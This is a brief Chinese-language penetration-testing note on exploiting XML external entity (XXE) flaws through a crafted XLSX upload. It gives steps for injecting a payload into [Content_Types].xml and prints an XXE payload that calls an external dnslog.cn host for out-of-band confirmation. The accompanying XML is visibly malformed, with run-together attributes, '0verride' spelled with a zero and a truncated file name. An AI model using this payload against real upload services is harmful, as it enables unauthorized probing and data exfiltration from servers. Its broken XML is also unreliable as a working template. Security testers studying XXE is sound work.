xlsx解压后有个xml文件，[Content_Types].xml文件中插入Payload
再压缩改后缀为xlsx后上传。

一般解析不回显，用dnslog外带。只验证存在的话：
```
<?xml version="1.0"encoding="UTF-8" standalone="yes"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://t4ykgs.dnslog.cn/test.dtd"> ]>
<x>&xxe;</x>

<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><DefaultExtension="xml"ContentType="application/xml"/>Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><0verride PartName="/xl/worksheets/sheet1.xm"ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><0verridePartName="/xl/theme/theme1.xml"ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/><0verride PartName="/xl/styles.xml"ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/><0verride PartName="/xl/sharedStrings.xml"ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/><0verridePartName="/docProps/core.xml"ContentType="application/vnd.openxmlformats-package.core-properties+xml"/><Override PartName="/docProps/app.xml"ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/><Override PartName="/docProps/custom.xml"ContentType=""application/vnd.openxmlformats-officedocument.custom-properties+xml"/></Types>
```
<https://www.jianshu.com/p/43ea59d3f673>
<https://cloud.tencent.com/developer/article/1668912>
